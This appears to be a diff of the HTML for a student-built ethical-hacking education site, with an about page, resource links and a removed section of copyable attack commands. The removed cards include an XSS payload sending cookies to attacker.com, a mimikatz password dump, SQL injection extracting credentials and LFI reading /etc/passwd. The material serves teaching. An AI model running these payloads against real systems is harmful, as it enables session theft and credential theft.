+  .road-dot{min-width:44px;height:44px;font-size:0.75rem;}
+  section{padding:60px 1.2rem;}
+}
+</style>
 </head>
 <body>
-<div class="app-wrapper">
-  <header class="sticky-header">
-    <div class="logo-area">
-      <h1>🔐 KRITANSEC ACADEMY</h1>
-      <p>By Kritan Basnet (Anjan Basnet) | Education Should Be Free</p>
+
+<canvas id="bg-canvas"></canvas>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-brand">Kr1t4n<span class="blink">.sec</span></div>
+  <ul class="nav-links">
+    <li><a href="#about">ABOUT</a></li>
+    <li><a href="#stack">STACK</a></li>
+    <li><a href="#free">RESOURCES</a></li>
+    <li><a href="#roadmap">ROADMAP</a></li>
+    <li><a href="#modules">MODULES</a></li>
+    <li><a href="#tools">TOOLS</a></li>
+    <li><a href="#quiz">QUIZ</a></li>
+    <li><a href="#ethics">PLEDGE</a></li>
+  </ul>
+  <div class="nav-status"><div class="pulse"></div>LIVE · FREE EDU</div>
+</nav>
+
+<!-- HERO -->
+<section id="hero">
+  <div class="hero-eyebrow">// NEPAL · CLASS 12 · RED TEAM · ETHICAL HACKING //</div>
+  <div class="glitch-name" data-text="Kr1t4n.sec">Kr1t4n.sec</div>
+  <div class="hero-subtitle">ETHICAL HACKER IN TRAINING · NEPALI STUDENT</div>
+  <div class="hero-tag">Built &amp; Designed by <span>Kritan</span> · 100% Free Education · No Paywalls Ever</div>
+
+  <div class="typewriter-wrap"><span id="typewriter"></span><span id="tw-cursor"></span></div>
+
+  <div class="term" style="margin-bottom:2.5rem;">
+    <div class="term-bar">
+      <div class="td r"></div><div class="td y"></div><div class="td g"></div>
+      <div class="term-title">kritan@kali:~$</div>
     </div>
-    <div class="free-badge"><i class="fas fa-gem"></i> 100% FREE • OPEN SOURCE</div>
-    <div class="search-container">
-      <div class="search-box">
-        <i class="fas fa-search"></i>
-        <input type="text" id="globalSearch" placeholder="Search 500+ topics, tools, techniques...">
+    <div class="term-body">
+      <div class="tcom"># Ethical Hacking Education Platform by Kritan — Nepal</div>
+      <div><span class="tc">$ whoami</span></div>
+      <div class="to">→ Kritan | Class 12 Science | Nepal 🇳🇵</div>
+      <div><span class="tc">$ cat skills.txt</span></div>
+      <div class="to">→ Python · C · Networking · Web Dev · Red Team · Kali Linux</div>
+      <div><span class="tc">$ cat mission.txt</span></div>
+      <div class="to">→ <span class="tw">Education must be FREE. No gatekeeping. No paywalls.</span></div>
+      <div class="to">→ Built this site myself to share knowledge with everyone.</div>
+      <div><span class="tc">$ nmap -sV knowledge.base</span></div>
+      <div class="to">→ PORT 80: Ethical Hacking Curriculum <span class="tc">OPEN</span></div>
+      <div class="to">→ PORT 443: Free Resources <span class="tc">OPEN</span></div>
+      <div class="to">→ PORT 8080: Hands-on Labs <span class="tc">OPEN</span></div>
+      <div><span class="tc">$ <span class="tcur"></span></span></div>
+    </div>
+  </div>
+
+  <div class="hero-btns">
+    <a href="#roadmap" class="btn btn-g">START LEARNING →</a>
+    <a href="#free" class="btn btn-o">FREE RESOURCES</a>
+    <a href="#about" class="btn btn-r">ABOUT ME</a>
+  </div>
+
+  <div class="hero-stats" style="margin-top:2.5rem;">
+    <div><div class="stat-n">100%</div><div class="stat-l">FREE FOREVER</div></div>
+    <div><div class="stat-n">12+</div><div class="stat-l">MODULES</div></div>
+    <div><div class="stat-n">50+</div><div class="stat-l">FREE LINKS</div></div>
+    <div><div class="stat-n">🇳🇵</div><div class="stat-l">MADE IN NEPAL</div></div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ABOUT -->
+<section id="about">
+  <div class="container">
+    <div class="sh">
+      <span class="stag">// 01. THE FOUNDER</span>
+      <h2 class="st">About Kritan</h2>
+      <p class="ss">The student behind this site — why I built it and what drives me.</p>
+    </div>
+    <div class="about-grid">
+      <div>
+        <div class="about-card">
+          <div class="avatar-ring">🧑‍💻</div>
+          <div class="founder-name">KRITAN</div>
+          <div class="founder-alias">// kr1t4n · red_team_student //</div>
+          <div class="badges">
+            <span class="badge">🇳🇵 NEPAL</span>
+            <span class="badge y">CLASS 12 SCIENCE</span>
+            <span class="badge r">RED TEAM</span>
+            <span class="badge c">ETHICAL HACKER</span>
+            <span class="badge">PYTHON DEV</span>
+            <span class="badge">SELF-TAUGHT</span>
+          </div>
+          <div class="skill-bars" style="margin-top:1.5rem;">
+            <div class="sbar-label"><span>Python</span><span class="pct">78%</span></div>
+            <div class="sbar-track"><div class="sbar-fill" data-w="78"></div></div>
+            <div class="sbar-label"><span>Linux / Kali</span><span class="pct">82%</span></div>
+            <div class="sbar-track"><div class="sbar-fill" data-w="82"></div></div>
+            <div class="sbar-label"><span>Networking</span><span class="pct">75%</span></div>
+            <div class="sbar-track"><div class="sbar-fill" data-w="75"></div></div>
+            <div class="sbar-label"><span>C Programming</span><span class="pct">60%</span></div>
+            <div class="sbar-track"><div class="sbar-fill" data-w="60"></div></div>
+            <div class="sbar-label"><span>Web Dev (Frontend)</span><span class="pct">70%</span></div>
+            <div class="sbar-track"><div class="sbar-fill" data-w="70"></div></div>
+            <div class="sbar-label"><span>Ethical Hacking</span><span class="pct">65%</span></div>
+            <div class="sbar-track"><div class="sbar-fill" data-w="65"></div></div>
+          </div>
+        </div>
+      </div>
+      <div class="about-text">
+        <p>Hi — I'm <span class="hi">Kritan</span>, a <strong>Class 12 Science student from Nepal 🇳🇵</strong>. I'm deeply passionate about cybersecurity, and my main focus is <strong>ethical hacking and red team operations</strong>.</p>
+        <p>My journey into hacking started out of pure curiosity — I wanted to understand how things <em>break</em> before I could understand how they <em>work</em>. I'm self-teaching using free platforms like TryHackMe, HackTheBox, and YouTube, alongside my school studies.</p>
+        <p>My current skill set spans <strong>Python scripting, C programming, computer networking, basic frontend web development, and Linux systems</strong>. I spend hours on CTF (Capture the Flag) challenges and reading documentation most students my age wouldn't touch.</p>
+        <p>I built this entire website <strong>myself</strong> — every line of HTML, CSS, and JavaScript written by hand. My goal was simple: <strong>create the resource I wish I had when I started</strong>. Free, deep, honest, and built for students like me — from Nepal and everywhere else in the world.</p>
+        <p>I believe that <strong>the best hackers come from places people least expect</strong>. Nepal is not Silicon Valley — but the curiosity here is just as sharp, and the hunger to learn is just as real.</p>
+
+        <div class="mission-box">
+          <h4>// MY MISSION</h4>
+          <p>Cybersecurity knowledge is hidden behind expensive courses and paywalls. That's wrong. A student in Kathmandu deserves the same quality education as someone in San Francisco. This site is my contribution to changing that — <strong>completely free, forever.</strong></p>
+        </div>
+
+        <div class="made-by" style="margin-top:1.2rem;">
+          <span style="color:var(--g)">⬡ DESIGNED BY:</span> <span>Kritan</span> &nbsp;|&nbsp;
+          <span style="color:var(--g)">⬡ DEVELOPED BY:</span> <span>Kritan</span> &nbsp;|&nbsp;
+          <span style="color:var(--g)">⬡ CONTENT BY:</span> <span>Kritan</span><br>
+          <span style="color:var(--dim);font-size:0.62rem;margin-top:6px;display:block;">// 100% original work · No templates · No frameworks · Pure HTML/CSS/JS · Made in Nepal 🇳🇵</span>
+        </div>
       </div>
     </div>
-  </header>
-
-  <div class="main-layout">
-    <aside class="sidebar">
-      <nav>
-        <ul>
-          <li><a href="#about" data-section="about"><i class="fas fa-user-astronaut"></i> About Creator</a></li>
-          <li><a href="#home" data-section="home"><i class="fas fa-home"></i> Dashboard</a></li>
-          <li><a href="#resources" data-section="resources"><i class="fas fa-link"></i> Free Resources</a></li>
-          <li><a href="#methodologies" data-section="methodologies"><i class="fas fa-sitemap"></i> Hacking Methodologies</a></li>
-          <li><a href="#webhacking" data-section="webhacking"><i class="fas fa-globe"></i> Web Hacking Deep Dive</a></li>
-          <li><a href="#network" data-section="network"><i class="fas fa-network-wired"></i> Network Pentesting</a></li>
-          <li><a href="#activedir" data-section="activedir"><i class="fas fa-building"></i> Active Directory</a></li>
-          <li><a href="#mobile" data-section="mobile"><i class="fas fa-mobile-alt"></i> Mobile Hacking</a></li>
-          <li><a href="#cloud" data-section="cloud"><i class="fas fa-cloud"></i> Cloud Security</a></li>
-          <li><a href="#tools" data-section="tools"><i class="fas fa-toolbox"></i> Tools Library</a></li>
-          <li><a href="#certifications" data-section="certifications"><i class="fas fa-certificate"></i> Free Certs</a></li>
-        </ul>
-      </nav>
-      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-      <div style="margin-top: 1rem; font-size: 0.8rem; text-align: center;"><span id="progressPercent">0</span>% Mastered</div>
-    </aside>
-
-    <main class="content">
-      <!-- About Creator Section -->
-      <section id="about" class="about-section">
-        <i class="fas fa-code" style="font-size: 3rem; color: var(--accent-primary);"></i>
-        <h2 style="margin: 1rem 0;">Kritan Basnet (Anjan Basnet)</h2>
-        <p style="max-width: 800px; margin: 0 auto;"><strong>Ethical Hacking Learner | Python Programmer | Computer Science Student</strong></p>
-        <p style="margin: 1rem auto; max-width: 700px;">I believe <strong>education should be free for everyone</strong>. This platform is my contribution to the cybersecurity community — providing world-class, 100% free ethical hacking education to beginners and professionals worldwide. No paywalls, no subscriptions, just knowledge.</p>
-        <p><i class="fas fa-envelope"></i> <strong>Contact me:</strong> nethunter435@gmail.com</p>
-        <a href="mailto:nethunter435@gmail.com" class="contact-btn"><i class="fas fa-paper-plane"></i> DM for Business/Collaboration</a>
-        <p style="margin-top: 1rem; font-size: 0.9rem;"><i class="fas fa-copyright"></i> KritanSec - Created with passion for free education | All techniques for authorized testing only</p>
-      </section>
-
-      <!-- Home Dashboard -->
-      <section id="home" class="section-card">
-        <div class="section-title">🌍 World's Largest Free Hacking University</div>
-        <p style="font-size: 1.1rem;">Join <strong>10,000+ students</strong> learning ethical hacking absolutely free. Complete roadmap from zero to red team expert.</p>
-        <div style="display: flex; gap: 1rem; flex-wrap: wrap; margin: 1.5rem 0;">
-          <span class="free-badge">📚 200+ Articles</span>
-          <span class="free-badge">🛠️ 100+ Tools</span>
-          <span class="free-badge">🎯 50+ Lab Platforms</span>
-          <span class="free-badge">🏆 Free Certificates</span>
-        </div>
-      </section>
-
-      <!-- FREE RESOURCES SECTION with clickable links -->
-      <section id="resources" class="section-card">
-        <div class="section-title">📚 100% Free Learning Resources</div>
-        <div class="resource-grid" id="resourcesGrid"></div>
-      </section>
-
-      <!-- HACKING METHODOLOGIES -->
-      <section id="methodologies" class="section-card">
-        <div class="section-title">⚔️ Complete Hacking Methodologies</div>
-        <div class="method-grid">
-          <div class="method-card"><h3>🔍 Reconnaissance</h3><p>OSINT, Google Dorks, Shodan, TheHarvester, Maltego</p><div class="code-block"><pre>theHarvester -d target.com -b all<br>shodan search 'org:"Target"'</pre><button class="copy-btn">Copy</button></div></div>
-          <div class="method-card"><h3>📡 Scanning & Enumeration</h3><p>Nmap, Masscan, Netcat, DNS enumeration, SMB enum</p><div class="code-block"><pre>nmap -sC -sV -p- -T4 target.com<br>enum4linux -a target.com</pre><button class="copy-btn">Copy</button></div></div>
-          <div class="method-card"><h3>💥 Exploitation</h3><p>Metasploit, Manual Exploits, Reverse Shells, Buffer Overflow</p><div class="code-block"><pre>msfconsole -q<br>use exploit/multi/handler</pre><button class="copy-btn">Copy</button></div></div>
-          <div class="method-card"><h3>🎭 Post-Exploitation</h3><p>Privilege Escalation (Linux/Windows), Persistence, Lateral Movement</p><div class="code-block"><pre>linpeas.sh<br>winpeas.exe<br>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"</pre><button class="copy-btn">Copy</button></div></div>
-          <div class="method-card"><h3>📝 Reporting</h3><p>Professional pentest reports, CVSS scoring, remediation steps</p></div>
-        </div>
-      </section>
-
-      <!-- WEB HACKING DEEP DIVE -->
-      <section id="webhacking" class="section-card">
-        <div class="section-title">🌐 Web Application Hacking - Complete Guide</div>
-        <div class="resource-grid">
-          <div class="resource-card"><h3>SQL Injection</h3><p>Union, Error-based, Blind, Time-based, Second-order</p><div class="code-block"><pre>' UNION SELECT username,password FROM users--<br>sqlmap -u "http://target.com?id=1" --dbs</pre><button class="copy-btn">Copy</button></div><a href="https://portswigger.net/web-security/sql-injection" target="_blank" class="btn-link">Practice Labs →</a></div>
-          <div class="resource-card"><h3>XSS (Cross-Site Scripting)</h3><p>Stored, Reflected, DOM-based, Blind XSS</p><div class="code-block"><pre>&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</pre><button class="copy-btn">Copy</button></div><a href="https://xss-game.appspot.com/" target="_blank" class="btn-link">XSS Game →</a></div>
-          <div class="resource-card"><h3>CSRF & SSRF</h3><p>Cross-Site Request Forgery, Server-Side Request Forgery attacks on internal services</p><a href="https://portswigger.net/web-security/csrf" target="_blank" class="btn-link">Learn CSRF →</a></div>
-          <div class="resource-card"><h3>LFI/RFI & Command Injection</h3><div class="code-block"><pre>?page=../../../../etc/passwd<br>; whoami && id</pre><button class="copy-btn">Copy</button></div></div>
-          <div class="resource-card"><h3>IDOR & Broken Access Control</h3><p>Insecure Direct Object References - change user IDs to access other accounts</p><a href="https://portswigger.net/web-security/access-control" target="_blank" class="btn-link">Access Control Labs →</a></div>
-        </div>
-      </section>
-
-      <!-- NETWORK PENTESTING -->
-      <section id="network" class="section-card">
-        <div class="section-title">🔌 Network Penetration Testing</div>
-        <div class="resource-grid">
-          <div class="resource-card"><h3>Nmap Mastery</h3><div class="code-block"><pre>nmap -sS -sV -O -p- target.com<br>nmap --script vuln target.com</pre><button class="copy-btn">Copy</button></div></div>
-          <div class="resource-card"><h3>Wi-Fi Hacking (WPA/WPA2)</h3><div class="code-block"><pre>airmon-ng start wlan0<br>airodump-ng wlan0mon<br>aireplay-ng -0 2 -a [BSSID] wlan0mon</pre><button class="copy-btn">Copy</button></div><a href="https://www.aircrack-ng.org/" target="_blank" class="btn-link">Aircrack-ng Guide →</a></div>
-          <div class="resource-card"><h3>MITM Attacks</h3><p>ARP Spoofing, DNS Spoofing, SSL Stripping</p><div class="code-block"><pre>ettercap -T -M arp:remote /target/ /gateway/</pre><button class="copy-btn">Copy</button></div></div>
-        </div>
-      </section>
-
-      <!-- ACTIVE DIRECTORY -->
-      <section id="activedir" class="section-card">
-        <div class="section-title">🏢 Active Directory Hacking (Enterprise Level)</div>
-        <div class="resource-grid">
-          <div class="resource-card"><h3>AD Enumeration</h3><div class="code-block"><pre>SharpHound.exe -c All<br>BloodHound<br>PowerView: Get-NetUser | select samaccountname</pre><button class="copy-btn">Copy</button></div></div>
-          <div class="resource-card"><h3>Kerberos Attacks</h3><div class="code-block"><pre># Kerberoasting<br>GetUserSPNs.py domain/user:pass -request<br># AS-REP Roasting<br>GetNPUsers.py domain/ -usersfile users.txt</pre><button class="copy-btn">Copy</button></div></div>
-          <div class="resource-card"><h3>Golden Ticket & Silver Ticket</h3><div class="code-block"><pre>mimikatz "kerberos::golden /user:Admin /domain:target.com /sid:S-1-5-21... /krbtgt:hash /ptt"</pre><button class="copy-btn">Copy</button></div><a href="https://www.ired.team/offensive-security/active-directory-kerberos-abuse" target="_blank" class="btn-link">AD Attack Guide →</a></div>
-        </div>
-      </section>
-
-      <!-- MOBILE HACKING -->
-      <section id="mobile" class="section-card">
-        <div class="section-title">📱 Mobile Application Security</div>
-        <div class="resource-grid">
-          <div class="resource-card"><h3>Android Pentesting</h3><p>APK decompiling, Dynamic analysis with Frida, Root detection bypass</p><div class="code-block"><pre>apktool d app.apk<br>frida -U -f com.app -l script.js</pre><button class="copy-btn">Copy</button></div><a href="https://mobilesecuritywiki.com/" target="_blank" class="btn-link">Mobile Security Wiki →</a></div>
-          <div class="resource-card"><h3>iOS Pentesting</h3><p>Jailbreak detection bypass, IPA analysis, Objection framework</p></div>
-        </div>
-      </section>
-
-      <!-- CLOUD SECURITY -->
-      <section id="cloud" class="section-card">
-        <div class="section-title">☁️ Cloud Security (AWS/Azure/GCP)</div>
-        <div class="resource-grid">
-          <div class="resource-card"><h3>AWS Pentesting</h3><p>S3 bucket enumeration, IAM privilege escalation, Lambda exploitation</p><div class="code-block"><pre>aws s3 ls s3://bucket-name<br>scoutsuite aws</pre><button class="copy-btn">Copy</button></div><a href="https://github.com/RhinoSecurityLabs/pacu" target="_blank" class="btn-link">AWS Pacu Framework →</a></div>
-          <div class="resource-card"><h3>Azure Security</h3><p>Azure AD attacks, Storage account enumeration, Microsft 365 testing</p><a href="https://github.com/NetSPI/MicroBurst" target="_blank" class="btn-link">MicroBurst for Azure →</a></div>
-        </div>
-      </section>
-
-      <!-- TOOLS LIBRARY -->
-      <section id="tools" class="section-card">
-        <div class="section-title">🛠️ Ultimate Tools Library</div>
-        <div class="tool-grid" id="toolsGrid"></div>
-      </section>
-
-      <!-- FREE CERTIFICATIONS -->
-      <section id="certifications" class="section-card">
-        <div class="section-title">🎓 Free Certifications & Courses</div>
-        <div class="resource-grid" id="certsGrid"></div>
-      </section>
-
-      <footer>
-        <p><i class="fas fa-heart" style="color: var(--accent-secondary);"></i> Created by <strong>Kritan Basnet (Anjan Basnet)</strong> | CS Student | Ethical Hacking Learner | Python Programmer</p>
-        <p>📧 Contact: nethunter435@gmail.com | All content is for educational & authorized testing only</p>
-        <p>© 2025 KritanSec - Democratizing Cybersecurity Education Worldwide</p>
-      </footer>
-    </main>
   </div>
-</div>
+</section>
+
+<div class="divider"></div>
+
+<!-- STACK -->
+<section id="stack">
+  <div class="container">
+    <div class="sh">
+      <span class="stag">// 02. MY TECH STACK</span>
+      <h2 class="st">What I Use &amp; Learn</h2>
+      <p class="ss">The technologies and areas I'm actively building skills in.</p>
+    </div>
+    <div class="stack-grid">
+      <div class="stack-card">
+        <span class="si">🐍</span>
+        <h3>Python</h3>
+        <p>My primary scripting language. Writing port scanners, keyloggers (ethical), automation scripts, and security tools from scratch.</p>
+        <div class="stack-lvl" style="color:var(--g)">▸ INTERMEDIATE</div>
+      </div>
+      <div class="stack-card">
+        <span class="si">⚙️</span>
+        <h3>C Programming</h3>
+        <p>Learning systems-level programming to understand memory, buffers, pointers — the foundation of understanding exploits.</p>
+        <div class="stack-lvl" style="color:var(--yel)">▸ BEGINNER–INTERMEDIATE</div>
+      </div>
+      <div class="stack-card">
+        <span class="si">🌐</span>
+        <h3>Computer Networking</h3>
+        <p>TCP/IP, DNS, HTTP, OSI model, subnetting, packet analysis with Wireshark. The backbone of all ethical hacking.</p>
+        <div class="stack-lvl" style="color:var(--g)">▸ INTERMEDIATE</div>
+      </div>
+      <div class="stack-card">
+        <span class="si">🐧</span>
+        <h3>Linux / Kali</h3>
+        <p>Daily Kali Linux user. Bash scripting, file permissions, process management, and running pentesting tools.</p>
+        <div class="stack-lvl" style="color:var(--g)">▸ INTERMEDIATE</div>
+      </div>
+      <div class="stack-card">
+        <span class="si">🎨</span>
+        <h3>Frontend Web Dev</h3>
+        <p>HTML, CSS, vanilla JavaScript. Built this entire site myself. Understanding web tech helps in web application hacking too.</p>
+        <div class="stack-lvl" style="color:var(--yel)">▸ INTERMEDIATE</div>
+      </div>
+      <div class="stack-card">
+        <span class="si">🔴</span>
+        <h3>Red Team Concepts</h3>
+        <p>Studying offensive security — recon, enumeration, exploitation, post-exploitation. Practicing on HackTheBox and TryHackMe.</p>
+        <div class="stack-lvl" style="color:var(--red)">▸ LEARNING</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- FREE RESOURCES -->
+<section id="free">
+  <div class="container">
+    <div class="sh">
+      <span class="stag">// 03. FREE RESOURCES</span>
+      <h2 class="st">Learn for Free — Real Links</h2>
+      <p class="ss">Every resource I personally use or recommend. Curated by Kritan. All free or freemium.</p>
+    </div>
+
+    <div class="res-tabs">
+      <button class="res-tab active" onclick="showTab(0)">PRACTICE LABS</button>
+      <button class="res-tab" onclick="showTab(1)">YOUTUBE</button>
+      <button class="res-tab" onclick="showTab(2)">COURSES</button>
+      <button class="res-tab" onclick="showTab(3)">READING</button>
+      <button class="res-tab" onclick="showTab(4)">TOOLS</button>
+    </div>
+
+    <div class="res-panels">
+      <!-- PANEL 0: LABS -->
+      <div class="res-panel active">
+        <div class="res-category">
+          <div class="res-cat-title">// HANDS-ON HACKING LABS</div>
+          <div class="res-list">
+            <a class="res-link" href="https://tryhackme.com" target="_blank">
+              <div class="res-icon">🏠</div>
+              <div class="res-info"><div class="res-name">TryHackMe</div><div class="res-desc">Best for beginners. Guided rooms with instructions. Start with "Pre-Security" path.</div><div class="res-free">FREE TIER</div></div>
+            </a>
+            <a class="res-link" href="https://hackthebox.com" target="_blank">
+              <div class="res-icon">📦</div>
+              <div class="res-info"><div class="res-name">Hack The Box</div><div class="res-desc">Real-world pentest machines. Free tier has retired machines. My daily practice.</div><div class="res-free">FREE TIER</div></div>
+            </a>
+            <a class="res-link" href="https://www.vulnhub.com" target="_blank">
+              <div class="res-icon">💾</div>
+              <div class="res-info"><div class="res-name">VulnHub</div><div class="res-desc">Download vulnerable VMs and practice offline. 100% free. Great for beginners.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://overthewire.org/wargames/" target="_blank">
+              <div class="res-icon">⚔️</div>
+              <div class="res-info"><div class="res-name">OverTheWire</div><div class="res-desc">Wargames to learn Linux and security concepts via challenges. Start with Bandit.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://picoctf.org" target="_blank">
+              <div class="res-icon">🚩</div>
+              <div class="res-info"><div class="res-name">PicoCTF</div><div class="res-desc">CTF platform for students. Perfect for learning in competition style. Beginner friendly.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://pentesterlab.com" target="_blank">
+              <div class="res-icon">🕸️</div>
+              <div class="res-info"><div class="res-name">PentesterLab</div><div class="res-desc">Web application hacking exercises. Free badge exercises cover SQL injection, XSS, more.</div><div class="res-free partial">FREEMIUM</div></div>
+            </a>
+            <a class="res-link" href="https://portswigger.net/web-security" target="_blank">
+              <div class="res-icon">🔒</div>
+              <div class="res-info"><div class="res-name">PortSwigger Web Academy</div><div class="res-desc">Free web security labs by the makers of Burp Suite. Best web hacking curriculum online.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://ctftime.org" target="_blank">
+              <div class="res-icon">🕐</div>
+              <div class="res-info"><div class="res-name">CTFtime.org</div><div class="res-desc">Global CTF competition calendar. Find live competitions to test your skills for free.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.hackthissite.org" target="_blank">
+              <div class="res-icon">🎯</div>
+              <div class="res-info"><div class="res-name">HackThisSite</div><div class="res-desc">Classic legal hacking challenges. Great for web hacking basics and old-school practice.</div><div class="res-free">100% FREE</div></div>
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <!-- PANEL 1: YOUTUBE -->
+      <div class="res-panel">
+        <div class="res-category">
+          <div class="res-cat-title">// FREE YOUTUBE CHANNELS</div>
+          <div class="res-list">
+            <a class="res-link" href="https://www.youtube.com/@TCMSecurityAcademy" target="_blank">
+              <div class="res-icon">📺</div>
+              <div class="res-info"><div class="res-name">TCM Security</div><div class="res-desc">Heath Adams. Best free ethical hacking course on YouTube. Practical and beginner-friendly.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.youtube.com/@_JohnHammond" target="_blank">
+              <div class="res-icon">📺</div>
+              <div class="res-info"><div class="res-name">John Hammond</div><div class="res-desc">CTF walkthroughs, malware analysis, and hacking tutorials. Very engaging and educational.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.youtube.com/@ippsec" target="_blank">
+              <div class="res-icon">📺</div>
+              <div class="res-info"><div class="res-name">IppSec</div><div class="res-desc">HackTheBox machine walkthroughs. Essential for learning how to approach real machines.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.youtube.com/@NetworkChuck" target="_blank">
+              <div class="res-icon">📺</div>
+              <div class="res-info"><div class="res-name">NetworkChuck</div><div class="res-desc">Networking, Linux, Python, ethical hacking. High energy and very digestible for beginners.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.youtube.com/@LiveOverflow" target="_blank">
+              <div class="res-icon">📺</div>
+              <div class="res-info"><div class="res-name">LiveOverflow</div><div class="res-desc">Deep dives into binary exploitation, CTF challenges, and low-level hacking concepts.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.youtube.com/@hak5" target="_blank">
+              <div class="res-icon">📺</div>
+              <div class="res-info"><div class="res-name">Hak5</div><div class="res-desc">Hacking hardware, social engineering, and practical security tools. Classic channel.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.youtube.com/@davidbombal" target="_blank">
+              <div class="res-icon">📺</div>
+              <div class="res-info"><div class="res-name">David Bombal</div><div class="res-desc">Networking, Python, Kali Linux. Great for students studying for certs like CompTIA.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.youtube.com/@professormesser" target="_blank">
+              <div class="res-icon">📺</div>
+              <div class="res-info"><div class="res-name">Professor Messer</div><div class="res-desc">Complete free Security+ and CompTIA courses. Best free cert prep on the internet.</div><div class="res-free">100% FREE</div></div>
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <!-- PANEL 2: COURSES -->
+      <div class="res-panel">
+        <div class="res-category">
+          <div class="res-cat-title">// FREE COURSES & LEARNING PLATFORMS</div>
+          <div class="res-list">
+            <a class="res-link" href="https://www.cybrary.it" target="_blank">
+              <div class="res-icon">📚</div>
+              <div class="res-info"><div class="res-name">Cybrary</div><div class="res-desc">Free cybersecurity courses including ethical hacking, CEH prep, network security and more.</div><div class="res-free partial">FREEMIUM</div></div>
+            </a>
+            <a class="res-link" href="https://www.coursera.org/google-certificates/cybersecurity-certificate" target="_blank">
+              <div class="res-icon">🎓</div>
+              <div class="res-info"><div class="res-name">Google Cybersecurity Cert</div><div class="res-desc">Google's free (audit) cybersecurity certificate on Coursera. Covers fundamentals thoroughly.</div><div class="res-free">FREE AUDIT</div></div>
+            </a>
+            <a class="res-link" href="https://www.edx.org/search?q=cybersecurity" target="_blank">
+              <div class="res-icon">🎓</div>
+              <div class="res-info"><div class="res-name">edX Cybersecurity</div><div class="res-desc">University-level cybersecurity courses from MIT, IBM, NYU. Audit all courses for free.</div><div class="res-free">FREE AUDIT</div></div>
+            </a>
+            <a class="res-link" href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank">
+              <div class="res-icon">💥</div>
+              <div class="res-info"><div class="res-name">Metasploit Unleashed</div><div class="res-desc">The definitive free Metasploit course by Offensive Security themselves. Must-read.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.sans.org/cyberaces/" target="_blank">
+              <div class="res-icon">🏛️</div>
+              <div class="res-info"><div class="res-name">SANS Cyber Aces</div><div class="res-desc">Free introductory courses in OS, networking, and systems by SANS Institute.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://cs50.harvard.edu/cybersecurity/" target="_blank">
+              <div class="res-icon">🏛️</div>
+              <div class="res-info"><div class="res-name">Harvard CS50 Cybersecurity</div><div class="res-desc">Free Harvard intro to cybersecurity course. High quality, great for students.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.kali.org/docs/" target="_blank">
+              <div class="res-icon">🐉</div>
+              <div class="res-info"><div class="res-name">Kali Linux Docs</div><div class="res-desc">Official Kali Linux documentation. Learn to set up and use the hacker's OS properly.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">
+              <div class="res-icon">🕷️</div>
+              <div class="res-info"><div class="res-name">OWASP Testing Guide</div><div class="res-desc">The bible of web application security testing. Free PDF download. Industry standard.</div><div class="res-free">100% FREE</div></div>
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <!-- PANEL 3: READING -->
+      <div class="res-panel">
+        <div class="res-category">
+          <div class="res-cat-title">// CHEATSHEETS & DOCUMENTATION</div>
+          <div class="res-list">
+            <a class="res-link" href="https://book.hacktricks.xyz" target="_blank">
+              <div class="res-icon">📖</div>
+              <div class="res-info"><div class="res-name">HackTricks</div><div class="res-desc">The ultimate free pentest cheatsheet. Covers every technique, tool, and attack vector.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">
+              <div class="res-icon">💣</div>
+              <div class="res-info"><div class="res-name">PayloadsAllTheThings</div><div class="res-desc">Massive GitHub repo of payloads for every web attack vector. Bookmark this immediately.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://gtfobins.github.io" target="_blank">
+              <div class="res-icon">🔓</div>
+              <div class="res-info"><div class="res-name">GTFOBins</div><div class="res-desc">Linux privilege escalation techniques using common binaries. Essential for Linux pentesting.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://lolbas-project.github.io" target="_blank">
+              <div class="res-icon">🪟</div>
+              <div class="res-info"><div class="res-name">LOLBAS Project</div><div class="res-desc">Living Off the Land Binaries — Windows built-in tools that can be abused for pentesting.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://exploit.education" target="_blank">
+              <div class="res-icon">💡</div>
+              <div class="res-info"><div class="res-name">Exploit.Education</div><div class="res-desc">Free VMs and guides for learning buffer overflows, format strings, and binary exploitation.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.exploit-db.com" target="_blank">
+              <div class="res-icon">🗄️</div>
+              <div class="res-info"><div class="res-name">Exploit-DB</div><div class="res-desc">Public CVE and exploit database. Learn how real vulnerabilities work by reading exploit code.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://cve.mitre.org" target="_blank">
+              <div class="res-icon">🔍</div>
